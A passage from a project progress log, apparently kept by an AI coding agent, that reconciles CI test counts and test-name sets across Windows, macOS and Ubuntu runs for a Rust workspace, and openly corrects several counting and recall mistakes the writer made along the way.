bootstrap validation OK: 17 phases, 166 tasks"* — then `node
scripts/taskctl.mjs validate` — *"state OK: 166 tasks"* — then the PowerShell
validator, which is to say the job reads `tasks/tasks.json` **and
`progress/state.json` as this commit wrote them**, so the acceptance's own claim
about the state file is what that job checked. `shellcheck-secondary` is `success`
and has no count to read.

### Reading run `34941955270`, `P3-T006`'s — and the by-name delta that closes from a third direction, on all three platforms at once

Run `34941955270`, commit `d58532a69361cf083dfec801c702de6cfcfc5e27`. All five jobs
`success`, by conclusion and by log:

| job | id | conclusion |
|---|---|---|
| `rust (windows-latest)` | `104292453364` | `success` |
| `rust (macos-latest)` | `104292453506` | `success` |
| `rust (ubuntu-latest)` | `104292453175` | `success` |
| `bootstrap-validate-windows` | `104292453425` | `success` |
| `shellcheck-secondary` | `104292453383` | `success` |

**The three logs were downloaded and read during this acceptance rather than the
implementation session's figures being transcribed into it.** `target/tmp/read-run.py`
over the three fresh logs:

| job | result lines | parents | children | passed | failed | ignored | **parents only** |
|---|---|---|---|---|---|---|---|
| `rust (windows-latest)` | 44 | 34 | 10 | 1182 | 0 | 9 | **1172** |
| `rust (macos-latest)` | 44 | 34 | 10 | 1183 | 0 | 9 | **1173** |
| `rust (ubuntu-latest)` | 44 | 34 | 10 | 1184 | 0 | 9 | **1174** |

**Windows CI equals this machine's own `cargo test --workspace --no-fail-fast`
exactly, 1172 for 1172, over the same 44 result lines = 34 parents + 10 children** —
as it did at `P3-T005` and at `P3-T002`. macOS is +1 and Ubuntu +2, the standing
platform-count shape. No `FAILED` name appears in any of the three logs.

**THE NAME CENSUS CLOSES FROM A DIRECTION THIS FILE HAS NOT USED BEFORE: not "the
new names are all present" but "the nameset moved by exactly the change".** Taking
each platform's set of test names from run `34938974624` and again from this run,
per name rather than per count:

| platform | before | after | added | removed | removed names |
|---|---|---|---|---|---|
| windows | 1127 | 1156 | **+30** | **−1** | `only_a_recording_lacks_a_schema` |
| macos | 1128 | 1157 | **+30** | **−1** | `only_a_recording_lacks_a_schema` |
| ubuntu | 1129 | 1158 | **+30** | **−1** | `only_a_recording_lacks_a_schema` |

**`+30 − 1` on all three, and the one name that left is the rename.** That is a
stronger statement than the previous convention made: *every* name that appeared
is one of the 30 the change added, in all three compiled trees, and *every* name
that disappeared is the single test that was renamed. All 31 names the change
introduces or renames — the 30 additions plus `only_the_two_recorded_kinds_lack_a_schema`
— are present on all three jobs, **93 of 93 cells**, checked by name rather than
by count because macOS is where a `#[cfg]`-gated test shows up as absent rather
than as failing.

**And the rename is why the naive set-difference says 31.** Diffing the disk
against `HEAD~1` per file yields 24 in `approval.rs`, 4 in `execution.rs` and
**3** in `store/record.rs`, for 31 — but `record.rs`'s `#[test]` count went 9 → 11,
which is **+2**, and the third name is `only_the_two_recorded_kinds_lack_a_schema`
replacing `only_a_recording_lacks_a_schema`. **A naive name diff cannot tell an
addition from a rename, and reports one as the other.** The `+30` is the number
that closes against the parent sum `1142 → 1172` and the source-level `#[test]`
count `1138 → 1168`, and the machine-checked `+30 −1` above is the number that
closes against CI. A commit message written from the naive diff would have said
`+31`, and nothing on this machine would have contradicted it.

**The per-platform differences are unchanged, and that is checked rather than
argued.** The six pairwise differences between the three runs' namesets are the
same six numbers before and after: `w−m = 13`, `m−w = 14`, `w−u = 12`, `u−w = 14`,
`m−u = 2`, `u−m = 3`. Read as sets: **12 names run on Windows alone** (the
batch-file, no-extension, PowerShell, drive/UNC/verbatim and Windows-path tests),
**12 run on both Unix jobs and not on Windows** (the link, pipe, executable-bit and
Unix-path tests), and one name runs on Windows and Ubuntu but not macOS
(`a_name_that_is_not_valid_unicode_is_ordered_by_the_name_and_not_by_its_text`).
**The two Unix jobs are not identical to each other either**, which the pair of
pairwise counts `m−u = 2` / `u−m = 3` states and a reader would otherwise smooth
over: two of the differences are one test in two spellings
(`a_program_whose_name_is_not_valid_utf8_cannot_be_created_on_macos` against
`..._is_the_program_that_runs`, and
`the_default_entry_point_folds_case_on_a_case_insensitive_platform` against
`..._folds_nothing_on_a_case_sensitive_platform`), and the third is the
`not_valid_unicode` name Ubuntu shares with Windows. **None of them is a test this
change touched**, and the way that is known is that the six numbers did not move.
**The count `m−u = 2` against `u−m = 3` is also the reason a symmetric phrase like
"macOS and Ubuntu differ by one test each" is not available here**: three
asymmetric numbers would have to be stated as two equal ones, which would be
false.

**AND ONE CORRECTION MADE WHILE THIS SECTION WAS BEING WRITTEN, WHICH BELONGS
HERE RATHER THAN IN A FOOTNOTE.** The first version of the line above read
`commit d58532a806e6a6a6b1de6c9b6f6e4d5e4a7c9b3f` — a forty-hex string with the
right first seven characters and **thirty-three invented ones**. It was caught by
running `git rev-parse HEAD` before the section was committed, and the real value
is `d58532a69361cf083dfec801c702de6cfcfc5e27`. The mechanism is worth naming
because it is the same one as `d58532a`'s own `1490` two sections up: **a value
that looks computed is the most dangerous kind of remembered value**, since a
short SHA is checkable at a glance against `git log` and a long one is not, and
the mind supplies the rest of the shape without flagging that it is guessing. The
anchor is one command away in both cases, and the rule this repository keeps
relearning is that the command is cheaper than the doubt.

**What this run does not say.** It says nothing about whether the gate admits the
right commands — no test in it can, since no caller exists and nothing reports an
authorisation. It says nothing about the store on a machine whose `%LOCALAPPDATA%`
is on a different volume, which no CI job exercises. It does not exercise the
`Deserialize` path against a value written by an *older* build, because no older
build wrote one. And it cannot see the one thing the module most needs a reader to
notice — that the record's categories are the categories the user was shown —
because that is a property of a prompt and no job displays one.

**The acceptance commit's own run was read as well, in the session that took it.**
`664575b` is the acceptance, run `34942566982` — **all five jobs `success`**,
Windows **1172** / macOS **1173** / Ubuntu **1174** parents with 0 failed and 9
ignored over 44 result lines = 34 parents + 10 children, and **each platform's
nameset identical to the implementation run's, 1165 / 1166 / 1167, `==` rather
than equal by count**. That is what a `progress/`-only change should produce, and
it is stated because the last two acceptances that claimed it had not checked —
this is the first acceptance chain on this branch whose second run was compared to
its first **by name on all three jobs**. The line is written into this file by the
next acceptance commit rather than this one, since the acceptance commit is
already pushed and no force push is available.

### Reading run `34938974624`, `P3-T005`'s — and a name census that under-counts by two, which the by-name convention had never seen

Run `34938974624`, commit `c940300d527c2f0f32ee27e88002c9d008a226aa`. All five
jobs `success`, by conclusion and by log:

| job | id | conclusion |
|---|---|---|
| `rust (windows-latest)` | `104283036403` | `success` |
| `rust (macos-latest)` | `104283036486` | `success` |
| `rust (ubuntu-latest)` | `104283036417` | `success` |
| `bootstrap-validate-windows` | `104283036450` | `success` |
| `shellcheck-secondary` | `104283036374` | `success` |

**The three logs were re-downloaded and re-read during this acceptance rather
than the implementation session's figures being transcribed into it.**
`target/tmp/read-run.py` over the three fresh logs reproduces them value for
value, which is the reason the numbers below are written as measured rather than
as remembered:

| job | result lines | result tuples | parents | children | passed | failed | ignored | **parents only** |
|---|---|---|---|---|---|---|---|---|
| `rust (windows-latest)` | 44 | 44 | 34 | 10 | 1152 | 0 | 9 | **1142** |
| `rust (macos-latest)` | 44 | 44 | 34 | 10 | 1153 | 0 | 9 | **1143** |
| `rust (ubuntu-latest)` | 44 | 44 | 34 | 10 | 1154 | 0 | 9 | **1144** |

**Windows CI equals this machine's own `cargo test --workspace --no-fail-fast`
exactly, 1142 for 1142, over the same 44 result lines = 34 parents + 10
children.** macOS and Ubuntu are +1 and +2, the standing platform-count shape.
No `FAILED` name appears in any of the three logs.

**All 26 new test names were found by name on all three jobs — 78 of 78 cells**,
and the by-name check is what makes the totals mean anything, since macOS is
where a `#[cfg]`-gated test would show up as absent rather than as failing. The
26 are 22 in `consent.rs`, 2 in `vocabulary.rs`, 1 in `execution.rs` and 1 in
`tests/spawn_sites.rs`; the per-file counts `0 → 22`, `12 → 14`, `22 → 23` and
`2 → 3` were taken out of git rather than remembered, and they are the same 26
that close the parent-sum delta `1116 → 1142` and the source-level `#[test]`
delta `1112 → 1138`. The per-platform name differences are the known `#[cfg]`
sets and are unchanged: Windows alone runs the batch-file, no-extension,
PowerShell and drive/UNC/verbatim tests; macOS and Ubuntu alone run the link,
pipe, executable-bit and non-UTF-8-name tests.

**THE FINDING, AND IT IS ABOUT THE CHECK RATHER THAN ABOUT THE RUN. The count of
`(binary, name)` pairs is exactly the parent sum on all three platforms —
1142 / 1143 / 1144 — while the count of distinct names is 1140 / 1141 / 1142.**
The two-name gap is the same two names on every platform, and each is **one test
name living in two different integration-test binaries**:
`a_manifest_sure_ran_out_of_budget_for_is_unread_and_never_absent` is in both
`discover_node.rs` and `discover_python.rs`, and
`a_relative_root_is_refused_rather_than_resolved_against_the_current_directory`
is in both `fingerprint_git.rs` and `scan_project.rs`. Nothing is missing — the
pair count reconciles to the reported sum exactly — but **a bare-name census
silently merges those two into one**, and "check the test by name" is this
file's standard cross-platform check. The under-count is small and it is a
*number that looks like agreement*, which is the shape recorded four times in
"Next concrete action" already. It cost nothing here because the check that
mattered was `is this name present` and not `how many names are there`; it would
have cost something in a comparison of two name sets, which is where this file
has used it before. Recorded because the next session will reach for the same
method.

**THE PER-BINARY CHECK THIS FILE HAS BEEN CARRYING IS NOT A CHECK AT ALL, AND
THIS RUN IS WHERE THAT BECAME VISIBLE — NOT BECAUSE THE ATTEMPT FAILED BUT
BECAUSE THE QUANTITY DOES NOT EXIST.** It is written down twice — as the last
clause of the "THE FIGURES ARE RECONCILED" paragraph of `P3-T005`'s acceptance
note in `progress/state.json`, and as the closing sentence of the `sum_all`
bullet in `progress/DECISIONS.md` — as the third check that *each test binary's
count of `... ok` lines equals its own reported `passed`*, which is a stronger
claim than the aggregate ones beside it. Attempting it again here gave
mismatches on all three platforms, and the cause is not the parser: **a test
binary that spawns nested runs of itself writes those runs' output to the same
inherited stdout, so their `test <name> ... ok` lines and their `test result:`
lines arrive under the parent's `Running` header with no header of their own.**
The Windows log says it in six consecutive lines —

```
     Running tests\store_concurrency.rs (target\debug\deps\store_concurrency-...exe)
running 7 tests
test child_writer ... ignored, spawned by the parent tests, not run on its own
running 1 test
running 1 test
running 1 test        <- six of these, then four `... ok` lines at once
```

— which is the ten "children" this file has been counting, seen from the side
that matters: they are **subprocesses of the test**, they run concurrently, and
their results land in the parent binary's block. `store_concurrency.rs` is the
deliberate case and `tests/process_runner.rs` is the same shape for a different
reason — reported `37`, 29 `... ok` lines attributed to it — because spawning
processes is what that file tests. **So "count the `... ok` lines under this
binary's `Running` header" has no single value for those binaries**, and a check
that compares it against `passed` is a check that cannot pass and, in the
previous task's run, printed nothing at all. **What it compared there is not
recoverable from this file** — no script for it survives in `target/tmp/`, which
is itself consistent with the check having been an inline command — so
the honest reading is that a check of a quantity that is not well-defined
reported no mismatch, which is the shape this file has recorded four times now:
a parse that fails into a smaller, plausible answer. Here it failed into
*silence*, which is worse.

The aggregate form is sound and is established above: **`(binary, name)` pairs
equal the reported parent sum exactly, on all three platforms** — 1142 / 1143 /
1144, which is what the per-binary invariant would have to sum to if it were
well-defined. The per-binary form is recorded as **not well-defined**, not as
"not re-checked", and the two notes that carry it — `P3-T004`'s read and
`P3-T005`'s acceptance note in `progress/state.json` — are **left as they were
written and corrected here**, on the same rule as `P3-T004`'s `1126`: an
accepted note records what was concluded at acceptance, and no force push or
history rewrite is available to change it. `target/tmp/bincounts.py` is
unaffected by this — it compares two runs by binary name, which is the aggregate
quantity and is well-defined.

The two secondary jobs, read rather than taken from their colour:
`bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases,
166 tasks.`, then `state OK: 166 tasks` from `node scripts/taskctl.mjs validate`,
then `SURE bootstrap validation OK: 17 phases, 166 tasks.` again and
`PowerShell bootstrap validation OK.`; `shellcheck-secondary` installed
`shellcheck 0.9.0-1` and ran it over `scripts/*.sh`,
`integrations/claude-code/scripts/*.sh` and `integrations/cursor/scripts/*.sh`
with the step green and no finding printed.

**The local gate set, re-run on the tree this acceptance commit is of** — which is
`c940300`'s tree, since the acceptance changes only `progress/`. `node
scripts/validate-bootstrap.mjs` — 17 phases, 166 tasks, OK. `node
scripts/taskctl.mjs validate` — `state OK: 166 tasks`. `cargo fmt --all -- --check`
— clean. `cargo check --workspace --all-targets` — clean. `cargo clippy
--workspace --all-targets -- -D warnings` — clean. `cargo test --workspace
--no-fail-fast` — **1142 parent tests passed, 0 failed, 9 ignored, over 44 result
lines = 34 parents + 10 children**, which is the Windows CI figure for figure.

### Reading run `34935781639`, `P3-T004`'s — and a log prefix that was a third variant of a trap this file already records

Run `34935781639`, commit `967c5e6`. All five jobs `success`:
`bootstrap-validate-windows`, `rust (windows-latest)`, `rust (macos-latest)`,
`rust (ubuntu-latest)`, `shellcheck-secondary`.

| job | result lines | result tuples | parents | children | passed | failed | ignored | **parents only** |
|---|---|---|---|---|---|---|---|---|
| `rust (windows-latest)` | 44 | 44 | 34 | 10 | 1126 | 0 | 9 | **1116** |
| `rust (macos-latest)` | 44 | 44 | 34 | 10 | 1127 | 0 | 9 | **1117** |
| `rust (ubuntu-latest)` | 44 | 44 | 34 | 10 | 1128 | 0 | 9 | **1118** |

**`rust (windows-latest)` reports 1126 passed over 44 results, which is this
machine's own run to the test** — same 44 lines, same 34 parents, same 10
children, same 1126. The parent count went **33 → 34** against `P3-T003` and the
child count stood still, which is the new `command_safety` test binary and
nothing else.

**macOS and Ubuntu are +1 and +2 over Windows, and the count of distinct test
names is the same +1 and +2 (1109 / 1110 / 1111), so the three jobs run the same
number of tests as they report passing.** The per-name set difference is much
larger than the net figure: macOS has **14** names Windows does not and Windows has
**13** macOS does not, and Ubuntu against Windows is **14** and **12**. Those sets
are the platform gates accumulated since `P2-T004` — `paths::compare::unix` versus
`paths::compare::windows`, the symlink and pipe cases, the not-valid-UTF-8 pair —
and **not one of the 38 names `P3-T004` added is in any of them.** That is the
`cfg!` choice measured rather than asserted: a task about a platform-dependent name
rule added **zero** platform-gated tests, where `#[cfg]` would have put its central
test in exactly one column.

**The result-line count and the result-tuple count are printed as two columns
because they are two facts, and this run is where they differ in the logs.** The
`logs.zip` this run was read from holds its per-job files with an **ISO-8601
timestamp prefix** — `2026-09-15T06:10:40.2991740Z test result: ok. 19 passed; …`
— where `gh run view --log` writes `job<TAB>step<TAB>timestamp ` and the extracted
per-step files write neither. **A `^test result:` pattern matches nothing in this
shape**, which is how the first reading of this run returned 0 result lines for
all three jobs while the logs plainly held 44 each. This file already records the
`gh run view` prefix as a trap; what is new is that **the prefix is a property of
which command produced the log, and there are at least three shapes** — so the
durable rule is to count `test result:` anywhere in the line and to read the file
rather than assume the shape. Both columns agree at 44 on all three jobs here, so
**the splice recorded against `fd878e6` did not occur this time.**

#### All 38 new test names, by name, on all three jobs

The check is per-name and per-job rather than a total, because a total cannot tell
a test that is present from a test that is absent while another is added. The
names were taken from the tree rather than typed: the ten in `execution.rs` by set
difference between `HEAD~1` and `HEAD`, and the rest by reading the two new files.

| group | count | windows | macos | ubuntu |
|---|---|---|---|---|
| `command_safety::*` (the new integration binary) | 19 | 19 | 19 | 19 |
| `safety::tests::*` (the classifier's module tests) | 8 | 8 | 8 | 8 |
| `execution::tests::*` (the domain's) | 10 | 10 | 10 | 10 |
| `command_class_wire_names_are_frozen` (`frozen!`-generated) | 1 | 1 | 1 | 1 |
| **total** | **38** | **38** | **38** | **38** |

**`windows_elides_an_exe_suffix_and_ignores_case_and_unix_does_neither` is in all
three columns, and that is the point of it.** It is written with `cfg!` rather than
`#[cfg]`, so it exists and runs everywhere and reads the arm belonging to the
platform it is on — which is why a by-name check finds it three times rather than
once. The `P3-T003` table one section below is the counter-example that made this
worth doing: three of its five names ran on one job each.

**A correction to the by-name check itself, made while taking this reading.** The
first pass looked for `command_safety::<name>` and found 19 of 38 — the whole
integration binary missing on all three jobs, including Windows, where a platform
gate could not explain it. **The names were wrong, not the logs**: in an
integration test the file *is* the crate root, so libtest prints `test
<name> ... ok` with no module prefix, and the `command_safety::` I had prepended
is a path that exists only for the module tests inside `src/`. A checker that
prefixes everything uniformly will report a green run as 19 missing tests, which is
the safe direction — but it is the same class of error as the log-prefix trap one
paragraph up, and it is recorded for the same reason.

### Reading run `34930744061`, `P3-T003`'s fix — and three deltas that are three different numbers on purpose

Run `34930744061`, commit `ea2f826`. All five jobs `success`:
`bootstrap-validate-windows`, `rust (windows-latest)`, `rust (macos-latest)`,
`rust (ubuntu-latest)`, `shellcheck-secondary`. The three rust jobs each report
**33 parents + 10 children, 0 failed, 9 ignored**:

| job | result lines | results | parents | children | passed | failed | ignored | **parents only** |
|---|---|---|---|---|---|---|---|---|
| `rust (windows-latest)` | 43 | 43 | 33 | 10 | 1088 | 0 | 9 | **1078** |
| `rust (macos-latest)` | 43 | 43 | 33 | 10 | 1089 | 0 | 9 | **1079** |
| `rust (ubuntu-latest)` | 43 | 43 | 33 | 10 | 1090 | 0 | 9 | **1080** |

**All three printed 43 physical lines, so the splice recorded against `fd878e6`
did not occur this time** — which is the whole of what can be said about a race
from the outside. The headline numbers in this file are the parent sums
(`1078 / 1079 / 1080`), per the convention established against `34924525793`; the
left-hand `passed` column is the total over all 43 results, which over-counts by
exactly the 10 children.

#### The three deltas, and why they are three different numbers

| platform | parents, `34927065374` → `34930744061` | delta | the names that moved, read out of the logs by name |
|---|---|---|---|
| Windows | 1077 → **1078** | **+1** | `a_program_name_that_is_not_a_windows_path_is_refused_rather_than_mangled` |
| macOS | 1076 → **1079** | **+3** | two script tests, plus `a_program_whose_name_is_not_valid_utf8_cannot_be_created_on_macos`; `a_program_whose_name_is_not_valid_utf8_is_the_program_that_runs` **left** this column |
| Ubuntu | 1077 → **1080** | **+3** | two script tests, plus `a_program_whose_name_is_not_valid_utf8_is_the_program_that_runs` |

**1 / 3 / 3 is the acceptance as arithmetic, and the totals alone could not have
shown it.** Each of the five new tests was looked for **by name in each of the
three logs**, which gives a 5 × 3 presence table — and that table is the thing the
acceptance sentence actually claims:

| test | ubuntu | macos | windows |
|---|---|---|---|
| `a_script_with_an_interpreter_line_runs_when_it_has_the_executable_bit` | yes | yes | — |
| `the_same_script_without_the_executable_bit_is_not_a_program` | yes | yes | — |
| `a_program_whose_name_is_not_valid_utf8_is_the_program_that_runs` | yes | — | — |
| `a_program_whose_name_is_not_valid_utf8_cannot_be_created_on_macos` | — | yes | — |
| `a_program_name_that_is_not_a_windows_path_is_refused_rather_than_mangled` | — | — | yes |

**A reading of this table that stops at "all three jobs are green" would say
nothing.** Two of the five ran on one job each, and the row that is about macOS is
absent from the other two by construction — so the check is per-name and per-job,
which is also what the module documentation tells a reader to do.

**The platform gate sets moved by exactly the five names, and the arithmetic
closes.** Ubuntu against Windows was `−11 +11` at `fd878e6` and is `−14 +12` here:
**+3** Unix-only names (the two script tests and the Linux one) and **+1**
Windows-only name, with every other name identical. Ubuntu against macOS was
`−2 +1` and is `−3 +2`: the two new names are this task's Linux test on the Ubuntu
side and this task's macOS test on the other. **Substituting the two name sets
into the totals reproduces them** — on macOS, `1080 − 3 + 2 = 1079` and on Windows
`1080 − 14 + 12 = 1078` — so the deltas are not merely consistent with the names,
they are accounted for by them.

**The ignored set is identical by name on all three jobs and unchanged at nine**
(`child_exits_with_the_code_it_was_given`, `child_floods_stdout`,
`child_reports_what_it_was_given`, `child_says_something_not_ascii`,
`child_sleeps`, `child_starts_a_grandchild`, `child_waits_to_be_released`,
`child_writer`, `child_writes_both_streams`). This task added no child, which is
why the child count stands at 10 and why the new tests can only be parent tests.

**Windows CI equals the local Windows run exactly, and it is checked on the parent
multiset rather than on the total**: `[0, 0, 0, 0, 2, 4, 4, 5, 6, 6, 7, 7, 7, 8,
8, 9, 12, 14, 15, 18, 20, 23, 24, 29, 30, 30, 31, 33, 43, 46, 48, 88, 501]` on
both, summing to 1078 on both. The run before it differs in **one position**,
`28 → 29`, and the by-name table over the two Windows logs prints **one row out of
29 matched binaries**: `process_runner` **28 → 29**. The 29 named binaries sum to
1073 and `Doc-tests sure_core` contributes the last 5, which is where the missing
five between 1073 and 1078 went.

#### The run before it was red, and what the flag did on that run

Run `34929385200`, commit `b0dcc69`: four jobs green and `rust (macos-latest)`
**failure**, with exactly one failing test in the workspace,
`a_program_whose_name_is_not_valid_utf8_is_the_program_that_runs`. The job still
reported **33 parents + 10 children** — the same 33 as the two jobs that passed —
and the position of the failure inside it is measurable rather than assumed:
**14 more binaries started after it and 19 of the 33 parent result lines came
after it.** `process_runner` is not the last target in the workspace, which is
exactly why the flag matters; what the *old* command would have done to that log is
inferred from the local 3-vs-29 measurement and is not claimed from this log.

#### What this run does not say

Nothing about a macOS on a differently-formatted volume, nothing about whether a
caller may name a `.cmd`/`.bat`, and nothing about the Unix columns from this
machine — the two Unix jobs are the only place any of that code has ever been
compiled, so their logs are not a check on a local measurement, they *are* the
measurement.

#### A fourth counting mistake, caught in this reading rather than after it

**The reader printed `ubuntu vs windows: -0 +0` — two jobs that ran the same
tests, which is not what happened.** The cause: `gh run view --log` writes
`job<TAB>step<TAB>timestamp ` in front of every line and `gh api …/logs` does not,
and the per-test pattern was anchored on `^test `, so it matched nothing in a
prefixed log. The counts table was unaffected (its pattern is not anchored), which
is the dangerous half: **a table of correct numbers sitting above a name
comparison of nothing.** Two fixes, and the second is the one that matters: strip
the prefix when it is there, and **refuse to print a name comparison for a log
that yielded results but no names.** The same repair pass found a second thing
worth recording: the numbered logs in `target/tmp/` are of both shapes, and the
`fd878e6` Ubuntu log is the spliced one, so counting **marked** tuples gave 42
results where the run printed 43. Counting `test result:` occurrences and using
the loose pattern for a line whose marker count exceeds its marked tuples
reproduces the recorded reading exactly — 42 physical lines, **43 results, 33
parents, 10 children, 1087 passed, 1077 parents** — which is the first time this
file's stored reading has been re-derived from the log instead of re-quoted.

### Reading run `34927065374`, `P3-T002`'s — and the line count that was a splice rather than a missing test

Run `34927065374`, commit `fd878e6`. All five jobs `success`:
`bootstrap-validate-windows`, `rust (windows-latest)`, `rust (macos-latest)`,
`rust (ubuntu-latest)`, `shellcheck-secondary`. The three rust jobs report
**33 parents + 10 children, 0 failed, 9 ignored**, over **43 results** — but
Ubuntu prints them on **42 lines**:

| job | result lines | results | parents | children | passed | failed | ignored |
|---|---|---|---|---|---|---|---|
| `rust (windows-latest)` | 43 | 43 | 33 | 10 | 1087 | 0 | 9 |
| `rust (macos-latest)` | 43 | 43 | 33 | 10 | 1086 | 0 | 9 |
| `rust (ubuntu-latest)` | **42** | **43** | 33 | 10 | 1087 | 0 | 9 |

**The 42 was read as a difference first, and it is not one.** Totalled by
physical line the three jobs read 43 / 43 / **42**, with Ubuntu showing nine
children where the other two show ten — the exact shape already recorded against
the `Preflight-Windows.ps1` log and against an earlier run, so it was attributed
before anything was written down. Ubuntu's missing line is **two child results
spliced into one physical line**, by the children `store_concurrency` spawns
sharing one inherited stdout handle. Verbatim, timestamp included:

```
2026-09-15T04:00:31.5038981Z test result: oktest result: ok. 1 passed; 0 failed;
 0 ignored; 0 measured; 6 filtered out. 1 passed; 0 failed; 0 ignored; 0
 measured; 6 filtered out; finished in 0.81s; finished in 0.80s
```

Two complete count tuples, two different durations, and the first result's
`test result: ok` clause written ahead of the second line with its own counts
following behind it. Counted by **occurrence of `test result: ok`** rather than
by line, Ubuntu is identical to Windows: 43 results, 1087 passed, 0 failed,
9 ignored, 1077 parents, 10 children. The method is two lines of Python
(`len(re.findall(...))` over the concatenated output rather than over the lines)
and it is now the third distinct counting mistake this section has had to
correct — the by-name counter that was 22 long, the matcher that matched nothing
and printed a well-formed table of zeros, and this. **The cause of all three is
the same: a parser whose failure mode is a plausible number rather than an
error.**

**Windows CI equals the local Windows run exactly, and that is checked on the
parent multiset rather than on the total.** The 33 parent values are
`[0, 0, 0, 0, 2, 4, 4, 5, 6, 6, 7, 7, 7, 8, 8, 9, 12, 14, 15, 18, 20, 23, 24,
28, 30, 30, 31, 33, 43, 46, 48, 88, 501]` on both, summing to 1077 on both, with
1087 passed and 9 ignored on both. **This reading was taken by re-running the
suite on this machine after the push**, not carried forward from the
implementation session, because the number in this file has to be a measurement.

**The +5 is attributed by name to one binary, and the check is that no other
binary moved.** Parsing each `Running` header against the result line beneath it
on Windows, `819d499` and `fd878e6` differ in exactly one position:
`tests\process_runner.rs` **23 → 28**. Every other binary is identical value for
value, so the whole of `P3-T002` is in that one file — which is also why the
parent *line* count stood still at 33 while five tests arrived, and why the ignored
count is the other half of the reading (**7 → 9**, the two new children). On
macOS and Ubuntu the same binary moved **20 → 25**, and the platform offset is
still the same set of pre-existing gates.

**The paragraph above was first written with a multiset I had predicted rather
than computed, and it was wrong in three positions** — `20, 25, 25` where the log
says `20, 23, 24`, and a `47` where it says `46`. It was caught by running the
same extraction over the downloaded logs before the section was committed, and it
is recorded because a predicted multiset is indistinguishable from a measured one
once it is written down, which is the failure this whole section exists to catch.

**macOS is 1076 against Ubuntu's 1077, and the difference is the same three names
as on `819d499` — checked rather than assumed.** Reading the three logs as sets of
names gives two names on Ubuntu and not macOS
(`a_name_that_is_not_valid_unicode_is_ordered_by_the_name_and_not_by_its_text`,
and
`paths::compare::tests::unix::the_default_entry_point_folds_nothing_on_a_case_sensitive_platform`)
and one on macOS and not Ubuntu
(`...the_default_entry_point_folds_case_on_a_case_insensitive_platform`) — the
identical three names the same comparison produced on `819d499`, so the gate is
pre-existing and this commit did not move it. Windows carries **11** names the
other two do not, again the identical 11 as on `819d499`: the three
`#[cfg(windows)]` process_runner tests,
`fingerprint::git::status::tests::a_path_that_is_not_valid_unicode_is_refused_on_windows`,
and seven `paths::compare::tests::windows` tests. This is the check `P3-T001`'s
reading did, repeated against the run before it rather than against a memory of
it.

**The five new tests were read out of all three logs by name, and so was the
ignored set.** 5 of 5 on Windows, macOS and Ubuntu, every one of them in the
`process_runner` binary; and the nine `#[ignore]`d children are identical **by
name** on all three jobs, including the two this task added
(`child_waits_to_be_released`, `child_says_something_not_ascii`). That second
check is the one that matters for this task: the tree test's fix depends on the
new child being spawned rather than merely existing, and a child that is compiled
in but never named would leave the ignored count at 9 on all three platforms and
the tree test asserting nothing.

**What this run does not say.** It says nothing about whether the stop reached the
grandchild on any job — that is the local measurement recorded under "What
`P3-T002` added", and the CI logs do not carry it. The tree tests report `ok` on
all three jobs, which is the same evidence that was true before this task when the
Windows branch was proving nothing, which is the point of the section above.

### Reading run `34924525793`, `P3-T001`'s — and a headline convention that had to be found before two numbers could be compared

Run `34924525793`, commit `819d499`. All five jobs `success`:
`bootstrap-validate-windows`, `rust (windows-latest)`, `rust (macos-latest)`,
`rust (ubuntu-latest)`, `shellcheck-secondary`. The three rust jobs each report
**43 result lines = 33 parents + 10 children, 0 failed, 7 ignored**:

| job | result lines | parents | children | passed | failed | ignored |
|---|---|---|---|---|---|---|
| `rust (windows-latest)` | 43 | 33 | 10 | 1082 | 0 | 7 |
| `rust (macos-latest)` | 43 | 33 | 10 | 1081 | 0 | 7 |
| `rust (ubuntu-latest)` | 43 | 33 | 10 | 1082 | 0 | 7 |

**Windows CI equals the local Windows run exactly, value for value** — the parent
multiset is `[0, 0, 0, 0, 2, 4, 4, 5, 6, 6, 7, 7, 7, 8, 8, 9, 12, 14, 15, 18,
20, 23, 23, 24, 30, 30, 31, 33, 43, 46, 48, 88, 501]` on both, and the parents
sum to 1072 on both. That is the comparison that means something; the totals
agreeing would not have been.

**The headline numbers in this file are the sum over the PARENT lines, and this
run is where that had to be established rather than assumed.** The full
`cargo test` total includes the ten child result lines `store_concurrency`'s
spawned children print — one passed each — so 1082 is the total over all 43 lines
while **1072 is the number comparable with `P2-T011`'s 1040**. The proof that the
recorded headline is the parent sum is the multiset itself: the 31 values
recorded for `P2-T011` sum to exactly 1040, and a multiset of parents cannot sum
to a total that includes children. Comparing the other way would have produced
"+42, attributed to +32 of name-level change and 10 of nothing".

**The +32 against `408b821`'s 1040, attributed by binary name with no
remainder**: the `sure-core` lib **495 → 501** (+6, the `process` unit tests),
`Doc-tests sure_core` **4 → 5** (+1, the module's `no_run` example), the new
`tests/process_runner.rs` binary at **23**, and the new `tests/spawn_sites.rs`
binary at **2**. `6 + 1 + 23 + 2 = 32`. The parent count went **31 → 33 by
exactly two**, which is the check that each new test file is one binary rather
than functions scattered into existing ones.

**The 37 names this task added were read out of all three logs by name**: 37 of
37 on Windows, **34 of 37 on macOS and Ubuntu, with exactly the three
`#[cfg(windows)]` batch-file tests absent** — which is the platform gate
confirmed by measurement rather than by reading the attribute. The names come
from the source files that define them (`target/tmp/names.py`), because a by-name
counter can be wrong in both directions and this file has recorded both.

**macOS is 1071 against Ubuntu's 1072, and the difference is named rather than
left as a number.** Comparing the three logs as *sets of names*
(`target/tmp/platformnames.py`) gives 11 names that run only on Windows and 12
that run only on Unix. Eight of the eleven are pre-existing
(`paths::compare::tests::windows::*`, seven, and
`fingerprint::git::status::tests::a_path_that_is_not_valid_unicode_is_refused_on_windows`);
the other three are this task's. All twelve Unix-only names are pre-existing —
six unit tests (`doctor`, `fingerprint::git::status`, `paths::compare::tests::unix`)
and six integration tests about links and pipes. The macOS/Ubuntu difference is
two gates: `a_name_that_is_not_valid_unicode_is_ordered_by_the_name_and_not_by_its_text`
is `#[cfg(not(target_os = "macos"))]` in `tests/scan_project.rs`, and the
`the_default_entry_point_folds_*` pair in `paths/compare.rs` is one test per
platform, macOS taking the case-insensitive one and Linux the case-sensitive one.
**The multiset is consistent with all of this and cannot establish it** — the
substitution `{501→498, 23→20, 23→20, 43→47, 30→25, 30→29}` reproduces the macOS
multiset arithmetically and is not the only such mapping — which is the same
limit recorded under `P2-T010`, reached again here.

**A trap in reading these logs, hit once more and worth one line.** My own parser
indexed the sixth field of a five-field `test result:` match and raised
`IndexError` rather than folding a wrong number into a table — the loud failure
this repository prefers. The GitHub log needed ANSI stripping for the `Running`
headers (recorded under `P2-T010`) and `gh --log`'s `job<TAB>step<TAB>timestamp`
